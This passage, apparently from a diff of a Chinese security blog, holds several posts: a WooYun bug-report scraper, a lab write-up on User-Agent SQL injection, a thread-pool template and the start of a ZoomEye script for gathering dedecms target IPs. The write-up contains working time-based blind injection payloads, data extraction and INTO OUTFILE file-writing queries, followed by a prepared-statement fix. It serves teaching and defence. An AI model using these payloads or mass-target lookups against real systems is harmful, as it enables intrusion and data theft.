class="line">            title = res.group(<span class="number">1</span>).strip()</span><br><span class="line">            comp = res.group(<span class="number">2</span>).strip()</span><br><span class="line">            author = res.group(<span class="number">3</span>).strip()</span><br><span class="line">            bug_type = res.group(<span class="number">4</span>).strip()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            msg = <span class="string">'[ - Detail_Excpt ] 未解析出 标题等相关信息：'</span> + id</span><br><span class="line">            print(msg)</span><br><span class="line">            ERR_LOG.write(msg+<span class="string">'\n'</span>)</span><br><span class="line">            Failed_ID.append(id)</span><br><span class="line">            title,comp,author,bug_type,rank = <span class="string">'Null'</span>,<span class="string">'Null'</span>,<span class="string">'Null'</span>,<span class="string">'Null'</span>,<span class="string">'Null'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res2 = self.pattern2.search(html)  <span class="comment"># 若厂商暂无回应则 rank 为 Null</span></span><br><span class="line">                rank = res2.group(<span class="number">1</span>).strip()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                msg = <span class="string">'[ - Rank_Excpt ] 未解析出 Rank：'</span> + id</span><br><span class="line">                print(msg)</span><br><span class="line">                ERR_LOG.write(msg+<span class="string">'\n'</span>)</span><br><span class="line">                rank = <span class="string">'Null'</span></span><br><span class="line">             </span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">print</span> (title,comp,author,bug_type,rank)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                msg = <span class="string">'[ - Print_Excpt ] 字符编码异常：'</span> + id +<span class="string">'::'</span>+ str(e)</span><br><span class="line">                print(msg)</span><br><span class="line">                ERR_LOG.write(msg+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">return</span> title,comp,author,bug_type,rank</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,thread_num,id_file)</span>:</span></span><br><span class="line">        self.queue = Queue() <span class="comment"># 需要执行的队列</span></span><br><span class="line">        self.threads = [] <span class="comment"># 多线程列表</span></span><br><span class="line">        self.add_task(id_file)</span><br><span class="line">        self.init_threads(thread_num)</span><br><span class="line">         </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_task</span><span class="params">(self,id_file)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(id_file) <span class="keyword">as</span> input:</span><br><span class="line">            <span class="keyword">for</span> id <span class="keyword">in</span> input.readlines():</span><br><span class="line">                self.queue.put(id.strip())         </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_threads</span><span class="params">(self,thread_num)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_num):</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'[ - info :] loading threading ---&gt; '</span>,i)</span><br><span class="line">            <span class="comment"># time.sleep(1)</span></span><br><span class="line">            self.threads.append(WooYunSpider(self.queue)) <span class="comment"># threads 列表装的是 爬虫线程</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> self.threads:</span><br><span class="line">            <span class="keyword">if</span> t.isAlive():</span><br><span class="line">                t.join()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://wooyun.org/bugs/wooyun-2016-0177647'</span></span><br><span class="line">    r = get(url,headers = HEADERS)</span><br><span class="line">    html = r.text</span><br><span class="line">    <span class="comment"># print type(html)</span></span><br><span class="line">    <span class="comment"># keywords" content="(.*?),(.*?),(.*?),wooyun  ====&gt; 厂商，白帽子，类型</span></span><br><span class="line">    pattern1 = re.compile(<span class="string">r'title&gt;(.*?)\| WooYun'</span>)</span><br><span class="line">    pattern2 = re.compile(<span class="string">r'keywords" content="(.*?),(.*?),(.*?),wooyun'</span>)</span><br><span class="line">    pattern3 = re.compile(<span class="string">r'漏洞Rank：(\d&#123;1,3&#125;)'</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">        res = pattern1.search(html)</span><br><span class="line">        <span class="comment"># print (res.group(1))</span></span><br><span class="line">        res = pattern2.search(html)</span><br><span class="line">        <span class="comment"># print (res.group(1),res.group(2),res.group(3))</span></span><br><span class="line">        res = pattern3.search(html)</span><br><span class="line">        <span class="comment"># print (res.group(1))</span></span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        print(x)</span><br><span class="line">    <span class="comment"># rank = res.group(4).strip()</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># print html</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://wooyun.org/bugs/wooyun-2016-0177647'</span></span><br><span class="line">    r = get(url,headers = HEADERS)</span><br><span class="line">    html = r.text</span><br><span class="line">    pattern = re.compile(<span class="string">r'title&gt;(.*?)\| WooYun.*?keywords" content="(.*?),(.*?),(.*?),wooyun.*?漏洞Rank：(\d&#123;1,3&#125;)'</span>,re.S)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">        res = pattern.search(html)</span><br><span class="line">        <span class="comment"># print (res.group(1),res.group(2),res.group(3),res.group(4),res.group(5))</span></span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        print(x)</span><br><span class="line"><span class="comment"># 保存结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save2file</span><span class="params">(filename,filename_failed_id)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'w'</span>) <span class="keyword">as</span> output:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> ID_DETAILS:</span><br><span class="line">            <span class="keyword">try</span>: <span class="comment"># 写入文件可能会诱发 gbk 编码异常，这里忽略</span></span><br><span class="line">                output.write(item + <span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">             </span><br><span class="line">    <span class="keyword">with</span> open(filename_failed_id,<span class="string">'w'</span>) <span class="keyword">as</span> output:</span><br><span class="line">        output.write(<span class="string">'\n'</span>.join(Failed_ID))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> </span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># test()</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 日志记录</span></span><br><span class="line">    ERR_LOG = open(<span class="string">'err_log.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">    RES_LOG = open(<span class="string">'res_log.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">    id_file = <span class="string">'id_0526.txt'</span></span><br><span class="line">    <span class="comment"># id_file = 'id_test.txt'</span></span><br><span class="line">    tp = ThreadPool(<span class="number">20</span>,id_file)</span><br><span class="line">    tp.wait()</span><br><span class="line"> </span><br><span class="line">    save2file(<span class="string">'id_details.txt'</span>,<span class="string">'failed_id.txt'</span>)</span><br><span class="line"> </span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[ - info ] cost time :&#123;:.2f&#125;s'</span>.format(end - start))</span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+    <a href="/2016/09/05/Flask-Web应用前端通用布局/" title="Flask-Web应用前端通用布局" itemprop="url">
   
-  <span></span> <a href="/tags/Python/">Python</a><a href="/tags/多线程/">多线程</a><a href="/tags/乌云爬虫/">乌云爬虫</a><a href="/tags/正则表达式/">正则表达式</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/05/27/wooyun-spider/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/05/27/wooyun-spider/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
+    <h1 itemprop="name">Flask-Web应用前端通用布局</h1>
     
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
+     
+           <p itemprop="description" >Head 区域（不包含JSFile）
+含有子页面可以覆盖的 beforecss 区块
+
+Body 区域（block body）1.导航区域
+
+nav 配合 bootstrap 实现
+
+2. Container 区域
+
+row最外层，col-md-12 次外层，内层根据需求来填充。</p>
+        
     
-      <a href="/2016/05/26/ua-sql-injection/" title="User-Agent 手工注入的探测与利用分析" itemprop="url">User-Agent 手工注入的探测与利用分析</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-05-26T10:15:23.000Z" itemprop="datePublished"> Published 2016-05-26</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>原理很简单：后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。 </p>
-<h3 id="0x00-Bug-代码："><a href="#0x00-Bug-代码：" class="headerlink" title="0x00 Bug 代码："></a>0x00 Bug 代码：</h3><p>本地顺手打了一个环境，Bug 代码部分：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存到访者的IP信息</span></span><br><span class="line">$db=DBConnect();</span><br><span class="line">$tbLog=$db-&gt;tbPrefix.<span class="string">'log'</span>; $executeArr=<span class="keyword">array</span>(<span class="string">'ip'</span>=&gt;($_SERVER[<span class="string">"HTTP_VIA"</span>])?$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]:$_SERVER[<span class="string">"REMOTE_ADDR"</span>],<span class="string">'ua'</span>=&gt;$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],<span class="string">'visit_time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>));</span><br><span class="line">$db-&gt;AutoExecute($tbLog,$executeArr);</span><br><span class="line">$smarty=InitSmarty();</span><br><span class="line">$smarty-&gt;assign(<span class="string">'do'</span>,$do);</span><br><span class="line">$smarty-&gt;assign(<span class="string">'show'</span>,$show);</span><br><span class="line">$smarty-&gt;assign(<span class="string">'url'</span>,$url);</span><br><span class="line">$smarty-&gt;display(<span class="string">'login.html'</span>);</span><br></pre></td></tr></table></figure>
-<p>　其中 AutoExecute() 方法 代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">AutoExecute</span><span class="params">($table,$array=array<span class="params">()</span>,$type=<span class="string">'INSERT'</span>,$where=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($array) &amp;&amp; !<span class="keyword">empty</span>($table))&#123;</span><br><span class="line">        <span class="keyword">switch</span>(strtoupper($type))&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'INSERT'</span>:</span><br><span class="line">                $sql=<span class="string">"INSERT INTO &#123;$table&#125;("</span>.implode(<span class="string">','</span>,array_keys($array)).<span class="string">") VALUES('"</span>.implode(<span class="string">"','"</span>,array_values($array)).<span class="string">"')"</span>;</span><br><span class="line">                <span class="keyword">echo</span> $sql;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;Execute($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看出 ip，ua 这个变量未经过任何过滤 以 SQL 拼接的方式插入到数据库中。</p>
-<h3 id="0x01-SQLMap-初探"><a href="#0x01-SQLMap-初探" class="headerlink" title="0x01 SQLMap 初探"></a>0x01 SQLMap 初探</h3><p>因为是 HTTP Header 注入，所以决定简单粗暴的使用 -r 参数测试有无注入。</p>
-<p>用burp 代理截包保存成 req.txt ,内容如下：</p>
-<pre><code>GET /index.php?do=login HTTP/1.1
-
-Host: localhost
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Cookie: csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs
-Connection: keep-alive
-</code></pre><p>使用 sqlmap.py -r req.txt –level 3 没跑出来，姿势不对？？？ 决定用自己的双手实现自己的梦想啦~~</p>
-<h3 id="0x02-手动注入测试"><a href="#0x02-手动注入测试" class="headerlink" title="0x02 手动注入测试"></a>0x02 手动注入测试</h3><p>使用burp 的repeater 模块，修改User-Agent：</p>
-<pre><code>GET /index.php?do=login HTTP/1.1
-
-Host: localhost
-User-Agent: Anka9080&apos;,(select(sleep(5))))#
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Cookie: csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs
-Connection: keep-alive
-</code></pre><p>结果真会发现等待了5s才收到网站的返回信息，延时注入测试成功~~</p>
-<p>该请求发送后，实际执行的SQL语句 如下：</p>
-<pre><code>INSERT INTO log(ip,ua,visit_time) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select(sleep(5))))#&apos;,&apos;2016-05-26 20:15:41&apos;)
-</code></pre><p>进一步分析这条SQL语句：</p>
-<p>Select(sleep(5))  返回的是 0 ，在外层加上一对括号，相当于单引号(‘’)，还有一个右括号) 用来闭合 VALUES 的 左括号，类似于字符型插入，后面的 # 是注释符，会把原本的时间等数据给注释掉，保证了这是一条可执行的SQL语句。</p>
-<h3 id="0x03-猜数据，读文件"><a href="#0x03-猜数据，读文件" class="headerlink" title="0x03 猜数据，读文件"></a>0x03 猜数据，读文件</h3><p>预先在数据库中创建了表 user(user,pass) 存在一个条目 admin,admin666</p>
-<p>通过sleep判断基于时间的延时注射，下面手工构造用户名并根据相应时间来判断是否存在这个用户（在 UA 位置执行整条SQL 来判断）：</p>
-<p>把 UA 的值改成如下：</p>
-<pre><code>User-Agent: Anka9080&apos;,(select sleep(5) from user where substring(user,1,1)=&apos;a&apos;))#
-</code></pre><p>执行的SQL是：</p>
-<pre><code>INSERT INTO log(ip,ua,visit_time) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select sleep(5) from user where substring(user,1,1)=&apos;a&apos;))#&apos;,&apos;2016-05-26 21:04:49&apos;)
-</code></pre><p>若user 表 中存在以a 开头的数据，则会延迟5秒返回页面，</p>
-<p>当然一般要先对用户表user 做 fuzzing， 这个把 where 条件去掉就可以了。</p>
-<p>同理 使用 substring(user,1,n) 来判断第n个字符是什么，继而得到了完整的字段的值。</p>
-<p>已经能读出数据了，尝试下读写文件，理论上有权限就可以。 </p>
-<p>把user 表的内容读出来并写入到服务器文件中：</p>
-<pre><code>INSERT INTO log(ip,ua,dt) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select * from user into outfile &apos;盘/绝对路径/1.txt&apos;))#&apos;,&apos;2016-05-26 21:30:04&apos;
-</code></pre><p>不知为何没有执行成功 在 SQL 查询器里单独执行 </p>
-<pre><code>select * from user into outfile &apos;盘/绝对路径/1.txt&apos;
-</code></pre><p>是可以的…</p>
-<p>如果注入点是有输出的位置，则</p>
-<p>利用Id = 1 union select 1, loadfile(‘盘/绝对路径/1.txt’) from message 来读取文件内容到页面显示</p>
-<p>此外，其他 HTTP Header 的注入与 User-Agent 的注入是一样道理的。</p>
-<h3 id="0x04-SQL注入防御"><a href="#0x04-SQL注入防御" class="headerlink" title="0x04 SQL注入防御"></a>0x04 SQL注入防御</h3><p>至于防御SQL注入，预编译吧，简单可靠，不需要做任何的过滤，做到了“数据和代码的分离</p>
-<pre><code class="php"><span class="meta">&lt;?php</span>
-
-$link = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>, <span class="string">'analytics_user'</span>, <span class="string">'aSecurePassword'</span>, <span class="string">'analytics_db'</span>);
-
-$stmt = $link-&gt;prepare(<span class="string">"INSERT INTO visits (ua, dt) VALUES (?, ?)"</span>);
-$stmt-&gt;bind_param(<span class="string">"ss"</span>, $_SERVER[<span class="string">"HTTP_USER_AGENT"</span>], date(<span class="string">"Y-m-d h:i:s"</span>));
-$stmt-&gt;execute();
-
-<span class="meta">?&gt;</span>
-</code></pre>
-<blockquote>
-<p>参考文章：<a href="http://www.freebuf.com/articles/web/105124.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/105124.html</a></p>
-</blockquote>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
+    <time datetime="2016-09-05T12:54:04.000Z" itemprop="datePublished">2016-09-05</time>
+  </a>
+</section>
 
 
-  <div class="article-tags">
+
+
+
+
   
-  <span></span> <a href="/tags/漏洞分析/">漏洞分析</a><a href="/tags/SQL注入/">SQL注入</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/05/26/ua-sql-injection/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/05/26/ua-sql-injection/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/05/24/python-multithreads-templete/" title="Python ThreadPool 线程池模板" itemprop="url">Python ThreadPool 线程池模板</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-05-24T10:11:29.000Z" itemprop="datePublished"> Published 2016-05-24</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x-00-Why"><a href="#0x-00-Why" class="headerlink" title="0x 00 Why"></a>0x 00 Why</h2><p>　　Python 的 简单多线程实现 用 dummy 模块 一句话就可以搞定，但需要对线程，队列做进一步的操作，最好自己写个线程池类来实现，考虑到后期会经常使用，所以把模板贴出来。</p>
-<h2 id="0x-01-Coding"><a href="#0x-01-Coding" class="headerlink" title="0x 01 Coding"></a>0x 01 Coding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># version: 0.1</span></span><br><span class="line"><span class="keyword">import</span> re,time</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="keyword">from</span> Queue <span class="keyword">import</span> Queue, Empty</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 全局变量</span></span><br><span class="line">COUNT = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 爬虫类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">(Thread)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for Spider"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">        self.start() <span class="comment"># 执行 run()</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"每次读取 queue 的一条"</span></span><br><span class="line">        <span class="keyword">global</span> COUNT</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sth = self.queue.get(block=false)</span><br><span class="line">            <span class="keyword">except</span> Empty:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[- Excpt :]'</span>,str(e)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">print</span> COUNT</span><br><span class="line">        COUNT += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 线程池类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.queue = Queue() <span class="comment"># 需要执行的队列</span></span><br><span class="line">        self.threads = [] <span class="comment"># 多线程列秒</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_task</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_threads</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> self.threads:</span><br><span class="line">            <span class="keyword">if</span> t.isAlive():</span><br><span class="line">                t.join()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"> </span><br><span class="line">    tp = ThreadPool(thread_num)</span><br><span class="line">    tp.wait()</span><br><span class="line"> </span><br><span class="line">    end = time.time()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[ - info ] cost time :&#123;&#125;'</span>.format(end - start)</span><br></pre></td></tr></table></figure>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+<section class="post" itemscope itemprop="blogitem">
   
-  <span></span> <a href="/tags/Python/">Python</a><a href="/tags/多线程/">多线程</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/05/24/python-multithreads-templete/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/05/24/python-multithreads-templete/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/03/30/zoomeye-api/" title="Python 调用 ZoomEye API 批量获取目标网站IP" itemprop="url">Python 调用 ZoomEye API 批量获取目标网站IP</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-03-30T10:03:39.000Z" itemprop="datePublished"> Published 2016-03-30</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330161710441-1284229011.png" alt=""></p>
-<h2 id="0x-00-前言"><a href="#0x-00-前言" class="headerlink" title="0x 00 前言"></a>0x 00 前言</h2><p>　　ZoomEye 的 API 在前几天正式对外部开发，这对网络渗透人员来说是一件开心的事</p>
-<p>　　可以说“妈妈再也不用担心批量测(x)试(zhan)没有资源了。”</p>
-<p>　　官方的 API 帮助文档在下面：</p>
-<p>　　<a href="https://www.zoomeye.org/api/" target="_blank" rel="external">https://www.zoomeye.org/api/</a></p>
-<p>　　看了下，使用方法是先提交账户，密码获得一个唯一的访问令牌（access_token）</p>
-<p>　　然后每次调用 API 的时候在 HTTP 的 Headers 里加上格式化后的 access_token 就可以使用了</p>
-<p>　　官方文档为了方便使用给出的是 cURL 方式调用 API ，在这里我给出一个用 Python 调用 API 的 Demo</p>
-<h2 id="0x-01-Code"><a href="#0x-01-Code" class="headerlink" title="0x 01 Code"></a>0x 01 Code</h2><p>　　该 Demo 抓取 ZoomEye 上 搜索 dedecms 的所有结果并把前 100 个IP保存到 文件中.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># author  : 